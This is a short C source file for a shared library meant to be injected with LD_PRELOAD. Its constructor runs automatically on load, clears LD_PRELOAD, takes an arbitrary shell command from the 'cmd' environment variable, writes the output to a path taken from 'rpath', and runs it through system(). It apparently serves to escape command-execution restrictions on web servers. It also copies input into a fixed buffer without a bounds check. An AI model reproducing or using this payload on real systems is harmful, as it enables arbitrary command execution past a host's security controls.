#include <stdlib.h>
#include <string.h>
__attribute__((constructor)) void call(){
    unsetenv("LD_PRELOAD");
    char str[65536];
    if (getenv("cmd") != NULL && getenv("rpath") != NULL){
        strcpy(str,getenv("cmd"));
        strcat(str," > ");
        strcat(str, getenv("rpath"));
        system(str);
}
}
